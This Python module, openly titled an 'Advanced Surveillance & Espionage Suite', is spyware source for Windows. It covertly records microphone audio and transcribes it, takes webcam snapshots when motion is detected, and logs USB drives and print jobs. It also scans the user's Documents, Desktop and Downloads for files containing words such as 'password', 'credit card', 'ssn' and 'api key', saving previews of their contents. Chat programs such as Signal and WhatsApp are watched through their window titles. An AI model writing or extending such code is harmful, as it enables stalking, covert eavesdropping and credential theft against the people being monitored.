"""
Advanced Surveillance & Espionage Suite
Comprehensive monitoring and data collection capabilities
"""
import os
import io
import cv2
import pyaudio
import wave
import threading
import time
import queue
import json
import win32gui
import win32con
import win32api
import win32print
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional
import subprocess
import psutil
import zipfile
import mimetypes

# Optional imports with fallbacks
try:
    import speech_recognition as sr
    SPEECH_RECOGNITION_AVAILABLE = True
except ImportError:
    SPEECH_RECOGNITION_AVAILABLE = False

try:
    import win32clipboard
    CLIPBOARD_AVAILABLE = True
except ImportError:
    CLIPBOARD_AVAILABLE = False

class SurveillanceSuite:
    """Advanced surveillance and espionage capabilities"""
    
    def __init__(self):
        self.recording_audio = False
        self.recording_video = False
        self.monitoring_usb = False
        self.monitoring_printer = False
        self.monitoring_documents = False
        self.monitoring_chat = False
        
        self.audio_thread = None
        self.video_thread = None
        self.usb_thread = None
        self.printer_thread = None
        self.document_thread = None
        self.chat_thread = None
        
        self.audio_queue = queue.Queue()
        self.video_queue = queue.Queue()
        self.surveillance_data = []
        
        # Audio configuration
        self.audio_format = pyaudio.paInt16
        self.audio_channels = 1
        self.audio_rate = 44100
        self.audio_chunk = 1024
        
        # Video configuration
        self.video_device = 0
        self.video_fps = 30
        self.video_resolution = (640, 480)
        
        # Monitoring directories
        self.document_dirs = [
            Path.home() / "Documents",
            Path.home() / "Desktop",
            Path.home() / "Downloads"
        ]
        
        # Chat application processes to monitor
        self.chat_processes = [
            "discord.exe", "slack.exe", "teams.exe", "skype.exe",
            "telegram.exe", "whatsapp.exe", "signal.exe", "zoom.exe"
        ]
        
        # Keywords for document analysis
        self.sensitive_keywords = [
            "password", "confidential", "secret", "private", "classified",
            "credit card", "ssn", "social security", "bank", "account",
            "login", "api key", "token", "credentials", "financial"
        ]
    
    def start_microphone_recording(self, duration_minutes: int = 60, voice_activation: bool = True) -> Dict:
        """Start microphone recording with optional voice activation"""
        if self.recording_audio:
            return {"success": False, "error": "Audio recording already active"}
        
        try:
            self.recording_audio = True
            self.audio_thread = threading.Thread(
                target=self._audio_recording_loop,
                args=(duration_minutes, voice_activation),
                daemon=True
            )
            self.audio_thread.start()
            
            return {
                "success": True,
                "message": f"Audio recording started for {duration_minutes} minutes",
                "voice_activation": voice_activation,
                "sample_rate": self.audio_rate,
                "channels": self.audio_channels
            }
            
        except Exception as e:
            self.recording_audio = False
            return {"success": False, "error": str(e)}
    
    def _audio_recording_loop(self, duration_minutes: int, voice_activation: bool):
        """Audio recording loop with voice activation detection"""
        try:
            audio = pyaudio.PyAudio()
            
            stream = audio.open(
                format=self.audio_format,
                channels=self.audio_channels,
                rate=self.audio_rate,
                input=True,
                frames_per_buffer=self.audio_chunk
            )
            
            frames = []
            start_time = time.time()
            end_time = start_time + (duration_minutes * 60)
            silence_threshold = 1000  # Adjust based on environment
            
            while self.recording_audio and time.time() < end_time:
                data = stream.read(self.audio_chunk)
                
                if voice_activation:
                    # Simple voice activity detection
                    audio_level = max(data)
                    if audio_level > silence_threshold:
                        frames.append(data)
                        
                        # Record for additional 2 seconds after voice detected
                        voice_end_time = time.time() + 2
                        while time.time() < voice_end_time and self.recording_audio:
                            additional_data = stream.read(self.audio_chunk)
                            frames.append(additional_data)
                        
                        # Save audio segment
                        self._save_audio_segment(frames, audio)
                        frames = []
                else:
                    frames.append(data)
            
            # Save remaining audio if any
            if frames:
                self._save_audio_segment(frames, audio)
            
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
        except Exception as e:
            print(f"Audio recording error: {e}")
        finally:
            self.recording_audio = False
    
    def _save_audio_segment(self, frames: List[bytes], audio: pyaudio.PyAudio):
        """Save audio segment to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_capture_{timestamp}.wav"
            filepath = Path("surveillance_data") / "audio" / filename
            filepath.parent.mkdir(parents=True, exist_ok=True)
            
            wf = wave.open(str(filepath), 'wb')
            wf.setnchannels(self.audio_channels)
            wf.setsampwidth(audio.get_sample_size(self.audio_format))
            wf.setframerate(self.audio_rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # Attempt speech recognition if available
            transcript = ""
            if SPEECH_RECOGNITION_AVAILABLE:
                transcript = self._transcribe_audio(filepath)
            
            audio_data = {
                "type": "audio_recording",
                "timestamp": datetime.now().isoformat(),
                "filename": filename,
                "filepath": str(filepath),
                "duration_seconds": len(frames) * self.audio_chunk / self.audio_rate,
                "transcript": transcript,
                "file_size": filepath.stat().st_size
            }
            
            self.surveillance_data.append(audio_data)
            
        except Exception as e:
            print(f"Error saving audio segment: {e}")
    
    def _transcribe_audio(self, audio_file: Path) -> str:
        """Transcribe audio to text using speech recognition"""
        try:
            r = sr.Recognizer()
            with sr.AudioFile(str(audio_file)) as source:
                audio_data = r.record(source)
                text = r.recognize_google(audio_data)
                return text
        except Exception:
            return ""
    
    def start_webcam_capture(self, motion_detection: bool = True, capture_interval: int = 5) -> Dict:
        """Start webcam capture with motion detection"""
        if self.recording_video:
            return {"success": False, "error": "Video recording already active"}
        
        try:
            # Test camera availability
            cap = cv2.VideoCapture(self.video_device)
            if not cap.isOpened():
                return {"success": False, "error": "No camera device found"}
            cap.release()
            
            self.recording_video = True
            self.video_thread = threading.Thread(
                target=self._video_capture_loop,
                args=(motion_detection, capture_interval),
                daemon=True
            )
            self.video_thread.start()
            
            return {
                "success": True,
                "message": "Webcam capture started",
                "motion_detection": motion_detection,
                "capture_interval": capture_interval,
                "resolution": self.video_resolution
            }
            
        except Exception as e:
            self.recording_video = False
            return {"success": False, "error": str(e)}
    
    def _video_capture_loop(self, motion_detection: bool, capture_interval: int):
        """Video capture loop with motion detection"""
        try:
            cap = cv2.VideoCapture(self.video_device)
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, self.video_resolution[0])
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, self.video_resolution[1])
            
            # Initialize motion detection
            background_subtractor = cv2.createBackgroundSubtractorMOG2() if motion_detection else None
            last_capture_time = 0
            
            while self.recording_video:
                ret, frame = cap.read()
                if not ret:
                    break
                
                current_time = time.time()
                should_capture = False
                
                if motion_detection and background_subtractor:
                    # Detect motion
                    fg_mask = background_subtractor.apply(frame)
                    motion_pixels = cv2.countNonZero(fg_mask)
                    
                    # Threshold for motion detection
                    if motion_pixels > 5000:  # Adjust threshold as needed
                        should_capture = True
                else:
                    # Regular interval capture
                    if current_time - last_capture_time >= capture_interval:
                        should_capture = True
                
                if should_capture:
                    self._save_video_frame(frame)
                    last_capture_time = current_time
                
                time.sleep(0.1)  # Prevent high CPU usage
            
            cap.release()
            
        except Exception as e:
            print(f"Video capture error: {e}")
        finally:
            self.recording_video = False
    
    def _save_video_frame(self, frame):
        """Save video frame to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
            filename = f"webcam_capture_{timestamp}.jpg"
            filepath = Path("surveillance_data") / "video" / filename
            filepath.parent.mkdir(parents=True, exist_ok=True)
            
            cv2.imwrite(str(filepath), frame)
            
            video_data = {
                "type": "webcam_capture",
                "timestamp": datetime.now().isoformat(),
                "filename": filename,
                "filepath": str(filepath),
                "resolution": self.video_resolution,
                "file_size": filepath.stat().st_size
            }
            
            self.surveillance_data.append(video_data)
            
        except Exception as e:
            print(f"Error saving video frame: {e}")
    
    def start_usb_monitoring(self) -> Dict:
        """Start USB device monitoring"""
        if self.monitoring_usb:
            return {"success": False, "error": "USB monitoring already active"}
        
        try:
            self.monitoring_usb = True
            self.usb_thread = threading.Thread(target=self._usb_monitoring_loop, daemon=True)
            self.usb_thread.start()
            
            return {
                "success": True,
                "message": "USB device monitoring started"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _usb_monitoring_loop(self):
        """Monitor USB devices and autorun"""
        previous_drives = set()
        
        while self.monitoring_usb:
            try:
                # Get current drives
                current_drives = set()
                for partition in psutil.disk_partitions():
                    if 'removable' in partition.opts:
                        current_drives.add(partition.device)
                
                # Check for new USB drives
                new_drives = current_drives - previous_drives
                for drive in new_drives:
                    self._process_new_usb_device(drive)
                
                # Check for removed drives
                removed_drives = previous_drives - current_drives
                for drive in removed_drives:
                    usb_data = {
                        "type": "usb_removed",
                        "timestamp": datetime.now().isoformat(),
                        "device": drive
                    }
                    self.surveillance_data.append(usb_data)
                
                previous_drives = current_drives
                time.sleep(2)  # Check every 2 seconds
                
            except Exception as e:
                print(f"USB monitoring error: {e}")
                time.sleep(5)
    
    def _process_new_usb_device(self, drive: str):
        """Process newly connected USB device"""
        try:
            usb_data = {
                "type": "usb_connected",
                "timestamp": datetime.now().isoformat(),
                "device": drive,
                "files": [],
                "autorun_files": []
            }
            
            # Scan USB device
            drive_path = Path(drive)
            if drive_path.exists():
                # Look for autorun files
                autorun_files = ["autorun.inf", "autorun.exe", "setup.exe"]
                for autorun_file in autorun_files:
                    autorun_path = drive_path / autorun_file
                    if autorun_path.exists():
                        usb_data["autorun_files"].append(str(autorun_path))
                
                # List interesting files
                for file_path in drive_path.rglob("*"):
                    if file_path.is_file():
                        file_ext = file_path.suffix.lower()
                        interesting_extensions = ['.exe', '.bat', '.cmd', '.scr', '.com', '.pif']
                        
                        if file_ext in interesting_extensions or file_path.stat().st_size < 10*1024*1024:  # Files under 10MB
                            file_info = {
                                "path": str(file_path),
                                "size": file_path.stat().st_size,
                                "extension": file_ext,
                                "modified": datetime.fromtimestamp(file_path.stat().st_mtime).isoformat()
                            }
                            usb_data["files"].append(file_info)
                        
                        if len(usb_data["files"]) > 100:  # Limit file list
                            break
            
            self.surveillance_data.append(usb_data)
            
        except Exception as e:
            print(f"Error processing USB device: {e}")
    
    def start_printer_monitoring(self) -> Dict:
        """Start printer job monitoring"""
        if self.monitoring_printer:
            return {"success": False, "error": "Printer monitoring already active"}
        
        try:
            self.monitoring_printer = True
            self.printer_thread = threading.Thread(target=self._printer_monitoring_loop, daemon=True)
            self.printer_thread.start()
            
            return {
                "success": True,
                "message": "Printer job monitoring started"
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _printer_monitoring_loop(self):
        """Monitor printer jobs"""
        previous_jobs = set()
        
        while self.monitoring_printer:
            try:
                current_jobs = set()
                
                # Get printer jobs using WMI or win32print
                try:
                    # Simple approach using win32print
                    printers = [win32print.GetDefaultPrinter()]
                    
                    for printer_name in printers:
                        printer_handle = win32print.OpenPrinter(printer_name)
                        jobs = win32print.EnumJobs(printer_handle, 0, -1, 1)
                        
                        for job in jobs:
                            job_id = f"{printer_name}_{job['JobId']}"
                            current_jobs.add(job_id)
                            
                            if job_id not in previous_jobs:
                                # New print job
                                printer_data = {
                                    "type": "print_job",
                                    "timestamp": datetime.now().isoformat(),
                                    "printer": printer_name,
                                    "job_id": job['JobId'],
                                    "document": job['pDocument'],
                                    "user": job['pUserName'],
                                    "pages": job['PagesPrinted'],
                                    "status": job['Status']
                                }
                                self.surveillance_data.append(printer_data)
                        
                        win32print.ClosePrinter(printer_handle)
                
                except Exception as e:
                    # Printer monitoring might fail on some systems
                    # Log the specific error for debugging
                    error_data = {
                        "timestamp": datetime.now().isoformat(),
                        "type": "printer_monitoring_error",
                        "printer": printer_name,
                        "error": str(e),
                        "error_type": type(e).__name__
                    }
                    self.surveillance_data.append(error_data)
                    
                    # Try to continue with other printers
                    continue
                
                previous_jobs = current_jobs
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                print(f"Printer monitoring error: {e}")
                time.sleep(10)
    
    def start_document_monitoring(self) -> Dict:
        """Start document content analysis"""
        if self.monitoring_documents:
            return {"success": False, "error": "Document monitoring already active"}
        
        try:
            self.monitoring_documents = True
            self.document_thread = threading.Thread(target=self._document_monitoring_loop, daemon=True)
            self.document_thread.start()
            
            return {
                "success": True,
                "message": "Document monitoring started",
                "monitored_directories": [str(d) for d in self.document_dirs]
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _document_monitoring_loop(self):
        """Monitor and analyze documents"""
        processed_files = set()
        
        while self.monitoring_documents:
            try:
                for doc_dir in self.document_dirs:
                    if not doc_dir.exists():
                        continue
                    
                    # Look for document files
                    doc_extensions = ['.txt', '.doc', '.docx', '.pdf', '.rtf', '.odt']
                    
                    for file_path in doc_dir.rglob("*"):
                        if (file_path.is_file() and 
                            file_path.suffix.lower() in doc_extensions and
                            str(file_path) not in processed_files):
                            
                            self._analyze_document(file_path)
                            processed_files.add(str(file_path))
                
                time.sleep(30)  # Check every 30 seconds
                
            except Exception as e:
                print(f"Document monitoring error: {e}")
                time.sleep(60)
    
    def _analyze_document(self, file_path: Path):
        """Analyze document for sensitive content"""
        try:
            content = ""
            
            # Extract text based on file type
            if file_path.suffix.lower() == '.txt':
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            elif file_path.suffix.lower() in ['.doc', '.docx']:
                # Would need python-docx library for proper extraction
                content = f"[DOCUMENT: {file_path.name}]"
            elif file_path.suffix.lower() == '.pdf':
                # Would need PyPDF2 or similar for proper extraction
                content = f"[PDF: {file_path.name}]"
            
            # Check for sensitive keywords
            found_keywords = []
            content_lower = content.lower()
            
            for keyword in self.sensitive_keywords:
                if keyword in content_lower:
                    found_keywords.append(keyword)
            
            if found_keywords:
                doc_data = {
                    "type": "sensitive_document",
                    "timestamp": datetime.now().isoformat(),
                    "filepath": str(file_path),
                    "filename": file_path.name,
                    "file_size": file_path.stat().st_size,
                    "keywords_found": found_keywords,
                    "content_preview": content[:500] + "..." if len(content) > 500 else content,
                    "modified": datetime.fromtimestamp(file_path.stat().st_mtime).isoformat()
                }
                self.surveillance_data.append(doc_data)
            
        except Exception as e:
            print(f"Error analyzing document {file_path}: {e}")
    
    def start_chat_monitoring(self) -> Dict:
        """Start chat application monitoring"""
        if self.monitoring_chat:
            return {"success": False, "error": "Chat monitoring already active"}
        
        try:
            self.monitoring_chat = True
            self.chat_thread = threading.Thread(target=self._chat_monitoring_loop, daemon=True)
            self.chat_thread.start()
            
            return {
                "success": True,
                "message": "Chat application monitoring started",
                "monitored_processes": self.chat_processes
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _chat_monitoring_loop(self):
        """Monitor chat applications"""
        while self.monitoring_chat:
            try:
                for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
                    try:
                        if proc.info['name'].lower() in [p.lower() for p in self.chat_processes]:
                            # Monitor chat application activity
                            chat_data = {
                                "type": "chat_activity",
                                "timestamp": datetime.now().isoformat(),
                                "process_name": proc.info['name'],
                                "pid": proc.info['pid'],
                                "cpu_percent": proc.info['cpu_percent'],
                                "memory_mb": proc.info['memory_info'].rss / 1024 / 1024,
                                "status": "active"
                            }
                            
                            # Try to get window titles for additional context
                            try:
                                def enum_windows_callback(hwnd, windows):
                                    if win32gui.IsWindowVisible(hwnd):
                                        window_pid = win32gui.GetWindowThreadProcessId(hwnd)[1]
                                        if window_pid == proc.info['pid']:
                                            title = win32gui.GetWindowText(hwnd)
                                            if title:
                                                windows.append(title)
                                
                                windows = []
                                win32gui.EnumWindows(enum_windows_callback, windows)
                                chat_data["window_titles"] = windows
                                
                            except Exception:
                                pass
                            
                            self.surveillance_data.append(chat_data)
                    
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
                
                time.sleep(10)  # Check every 10 seconds
                
            except Exception as e:
                print(f"Chat monitoring error: {e}")
                time.sleep(30)
    
    def stop_all_surveillance(self) -> Dict:
        """Stop all surveillance activities"""
        try:
            self.recording_audio = False
            self.recording_video = False
            self.monitoring_usb = False
            self.monitoring_printer = False
            self.monitoring_documents = False
            self.monitoring_chat = False
            
            # Wait for threads to finish
            threads = [
                self.audio_thread, self.video_thread, self.usb_thread,
                self.printer_thread, self.document_thread, self.chat_thread
            ]
            
            for thread in threads:
                if thread and thread.is_alive():
                    thread.join(timeout=2)
            
            return {
                "success": True,
                "message": "All surveillance activities stopped",
                "data_collected": len(self.surveillance_data)
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_surveillance_data(self, data_type: str = None, limit: int = 100) -> Dict:
        """Get collected surveillance data"""
        try:
            filtered_data = self.surveillance_data
            
            if data_type:
                filtered_data = [d for d in self.surveillance_data if d.get('type') == data_type]
            
            # Sort by timestamp (most recent first)
            filtered_data.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
            
            return {
                "success": True,
                "data": filtered_data[:limit],
                "total_records": len(filtered_data),
                "data_types": list(set(d.get('type') for d in self.surveillance_data))
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_surveillance_status(self) -> Dict:
        """Get current surveillance status"""
        return {
            "success": True,
            "status": {
                "audio_recording": self.recording_audio,
                "video_recording": self.recording_video,
                "usb_monitoring": self.monitoring_usb,
                "printer_monitoring": self.monitoring_printer,
                "document_monitoring": self.monitoring_documents,
                "chat_monitoring": self.monitoring_chat,
                "total_data_collected": len(self.surveillance_data)
            }
        }

# Global surveillance suite instance
surveillance_suite = SurveillanceSuite()